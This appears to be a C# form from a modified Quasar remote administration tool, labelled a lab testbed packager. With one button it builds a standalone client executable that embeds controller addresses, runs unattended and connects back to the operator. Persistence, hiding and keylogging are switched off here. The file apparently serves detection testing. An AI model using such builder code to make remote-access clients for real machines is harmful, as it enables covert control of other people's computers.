// ---------------------------------------------------------------------------
// Quasar 检测评估实验台 · 实验室基线样本（Quasar-LabBaseline）
// 作者：陈森（Chen Sen）  https://github.com/chendashi666
// 本文件由陈森创作或改造：禁止盗卖，禁止商业用途。
// 上游 Quasar 代码版权归 MaxXor 及 Quasar 贡献者所有（MIT License）。
// ---------------------------------------------------------------------------

using Quasar.Common.Config;
using Quasar.Common.Properties;
using Quasar.Server.Build;
using Quasar.Server.Models;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    /// <summary>
    /// Laboratory one click packaging console.
    /// <para>
    /// Fill in the internal testbed address and press a single button: the console produces a
    /// functionality complete baseline client with the run parameters embedded into the
    /// executable, so the produced single file can be delivered on its own. A matching
    /// config.json is written next to it as the override layer for switching experiment
    /// conditions without rebuilding.
    /// </para>
    /// </summary>
    public partial class FrmLabPackager : Form
    {
        private Thread _worker;

        public FrmLabPackager()
        {
            InitializeComponent();

            txtOutputDir.Text = DefaultOutputDirectory();
            txtMutex.Text = Guid.NewGuid().ToString();

            AppendLog("作者：陈森（Chen Sen） - https://github.com/chendashi666");
            AppendLog("禁止盗卖，禁止商业用途 | 上游 Quasar (c) MaxXor (MIT)");
            AppendLog(LabStrings.LabName + " " + LabStrings.ProductName);
            AppendLog("客户端模板 : " + ClientBinaryPath());
            AppendLog("实验台 CA  : " + Quasar.Server.Models.Settings.CertificatePath);
            AppendLog("填写控制端内网地址后点击「一键出包」。");
        }

        private static string ClientBinaryPath()
        {
            return Path.Combine(Application.StartupPath, LabStrings.ClientBinaryName);
        }

        private static string DefaultOutputDirectory()
        {
            return Path.GetFullPath(Path.Combine(Application.StartupPath, "..", "LabBaseline"));
        }

        private void AppendLog(string message)
        {
            if (txtLog.IsDisposed)
                return;

            if (txtLog.InvokeRequired)
            {
                txtLog.BeginInvoke(new Action<string>(AppendLog), message);
                return;
            }

            txtLog.AppendText('[' + DateTime.Now.ToString("HH:mm:ss", CultureInfo.InvariantCulture) + "] " + message + Environment.NewLine);
            txtLog.SelectionStart = txtLog.TextLength;
            txtLog.ScrollToCaret();
        }

        private void SetBusy(bool busy)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action<bool>(SetBusy), busy);
                return;
            }

            btnPackage.Enabled = !busy;
            btnPackage.Text = busy ? "正在出包..." : "一键出包";
            txtHosts.Enabled = !busy;
            txtOutputDir.Enabled = !busy;
        }

        /// <summary>
        /// Normalizes the entered addresses into the raw host list the client expects
        /// ("host:port;host:port;"). Entries without a port inherit the port field.
        /// </summary>
        private string ComposeHosts()
        {
            var port = (int) numPort.Value;
            var raw = new StringBuilder();

            var lines = txtHosts.Text.Replace("\r", ";").Replace("\n", ";").Split(';');
            foreach (var line in lines)
            {
                var entry = line == null ? string.Empty : line.Trim();
                if (entry.Length == 0)
                    continue;

                // accept "ip", "ip:port" and "ip port"
                entry = entry.Replace(' ', ':');
                if (entry.IndexOf(':') < 0)
                    entry = entry + ":" + port.ToString(CultureInfo.InvariantCulture);

                raw.Append(entry).Append(';');
            }

            return raw.ToString();
        }

        private void btnGenerateMutex_Click(object sender, EventArgs e)
        {
            txtMutex.Text = Guid.NewGuid().ToString();
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (var dialog = new FolderBrowserDialog())
            {
                dialog.Description = "选择基线样本输出目录";
                dialog.ShowNewFolderButton = true;
                if (Directory.Exists(txtOutputDir.Text))
                    dialog.SelectedPath = txtOutputDir.Text;

                if (dialog.ShowDialog(this) == DialogResult.OK)
                    txtOutputDir.Text = dialog.SelectedPath;
            }
        }

        private void btnOpenFolder_Click(object sender, EventArgs e)
        {
            var directory = txtOutputDir.Text;
            if (!Directory.Exists(directory))
            {
                MessageBox.Show(this, "输出目录还不存在: " + directory, "实验室出包控制台",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            Process.Start("explorer.exe", '"' + directory + '"');
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void btnPackage_Click(object sender, EventArgs e)
        {
            if (_worker != null && _worker.IsAlive)
                return;

            var hosts = ComposeHosts();
            if (hosts.Length == 0)
            {
                MessageBox.Show(this, "请先填写控制端内网地址。", "实验室出包控制台",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                txtHosts.Focus();
                return;
            }

            var clientBinary = ClientBinaryPath();
            if (!File.Exists(clientBinary))
            {
                MessageBox.Show(this, "未找到客户端模板: " + clientBinary + "\n请先运行 build_release.ps1 完成构建。",
                    "实验室出包控制台", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var request = new PackageRequest
            {
                Hosts = hosts,
                Tag = txtTag.Text.Trim(),
                Subnet = txtSubnet.Text.Trim(),
                Mutex = txtMutex.Text.Trim(),
                OutputDirectory = txtOutputDir.Text.Trim(),
                FileName = txtFileName.Text.Trim(),
                WriteExternalConfiguration = chkWriteConfig.Checked
            };

            if (string.IsNullOrWhiteSpace(request.Tag))
                request.Tag = "LAB";
            if (string.IsNullOrWhiteSpace(request.Mutex))
            {
                request.Mutex = Guid.NewGuid().ToString();
                txtMutex.Text = request.Mutex;
            }
            if (string.IsNullOrWhiteSpace(request.FileName))
                request.FileName = "LabBaseline.exe";

            SetBusy(true);
            AppendLog("开始出包: hosts=" + request.Hosts + " tag=" + request.Tag);
            _worker = new Thread(PackageWorker);
            _worker.IsBackground = true;
            _worker.Start(request);
        }

        private void PackageWorker(object state)
        {
            var request = (PackageRequest) state;
            try
            {
                if (!Directory.Exists(request.OutputDirectory))
                    Directory.CreateDirectory(request.OutputDirectory);

                // First run on a machine without a laboratory authority: create it on the spot.
                bool certificateCreated;
                var laboratoryCertificate = LabCertificate.EnsureAtDefaultPath(out certificateCreated);
                if (certificateCreated)
                {
                    AppendLog("已自动生成实验台 CA: " + Quasar.Server.Models.Settings.CertificatePath);
                    AppendLog("CA 指纹: " + laboratoryCertificate.Thumbprint);
                }

                var outputPath = Path.Combine(request.OutputDirectory, request.FileName);

                var options = new BuildOptions
                {
                    OutputPath = outputPath,
                    Tag = request.Tag,
                    Mutex = request.Mutex,
                    UnattendedMode = true,
                    RawHosts = request.Hosts,
                    Delay = 5000,
                    Version = Application.ProductVersion,
                    IconPath = string.Empty,
                    InstallPath = 1,
                    InstallSub = LabStrings.DefaultInstallSubDirectory,
                    InstallName = request.FileName,
                    StartupName = "LabBaseline",
                    Install = false,
                    Startup = false,
                    HideFile = false,
                    HideInstallSubdirectory = false,
                    Keylogger = false,
                    LogDirectoryName = LabStrings.DefaultLogDirectory,
                    HideLogDirectory = false
                };

                var builder = new ClientBuilder(options, ClientBinaryPath());
                builder.LabSubnet = request.Subnet;
                builder.Build();
                AppendLog("已生成被控端: " + outputPath);

                // The external configuration is the override layer of the embedded one.
                var configuration = LabConfigFactory.FromBuildOptions(options);
                configuration.Subnet = request.Subnet;
                var configPath = Path.Combine(request.OutputDirectory, LabConfig.FileName);
                if (request.WriteExternalConfiguration)
                {
                    configuration.SaveTo(configPath);
                    AppendLog("已生成覆盖配置: " + configPath);
                }
                else if (File.Exists(configPath))
                {
                    File.Delete(configPath);
                    AppendLog("已移除覆盖配置（纯单文件模式）");
                }

                var size = new FileInfo(outputPath).Length;
                AppendLog("文件大小: " + size.ToString(CultureInfo.InvariantCulture) + " 字节");
                AppendLog("SHA256  : " + ComputeSha256(outputPath));
                AppendLog("内嵌参数: hosts=" + request.Hosts + " port=" + configuration.Port.ToString(CultureInfo.InvariantCulture) +
                          " tag=" + request.Tag + " subnet=" + request.Subnet);
                AppendLog("完成。" + (request.WriteExternalConfiguration
                    ? "单文件可独立运行；如需切换实验条件，只改同目录 config.json。"
                    : "单文件可独立运行，无外部依赖。"));

                BeginInvoke(new Action(() =>
                {
                    lblStatus.Text = "出包完成: " + outputPath;
                }));
            }
            catch (Exception ex)
            {
                AppendLog("错误: " + ex.Message);
                BeginInvoke(new Action(() =>
                {
                    MessageBox.Show(this, "出包失败:\n" + ex.Message, "实验室出包控制台",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }));
            }
            finally
            {
                SetBusy(false);
            }
        }

        private static string ComputeSha256(string path)
        {
            using (var stream = File.OpenRead(path))
            using (var sha = SHA256.Create())
            {
                var hash = sha.ComputeHash(stream);
                var text = new StringBuilder(hash.Length * 2);
                foreach (var b in hash)
                    text.Append(b.ToString("X2", CultureInfo.InvariantCulture));
                return text.ToString();
            }
        }

        private class PackageRequest
        {
            public string Hosts { get; set; }
            public string Tag { get; set; }
            public string Subnet { get; set; }
            public string Mutex { get; set; }
            public string OutputDirectory { get; set; }
            public string FileName { get; set; }
            public bool WriteExternalConfiguration { get; set; }
        }
    }
}
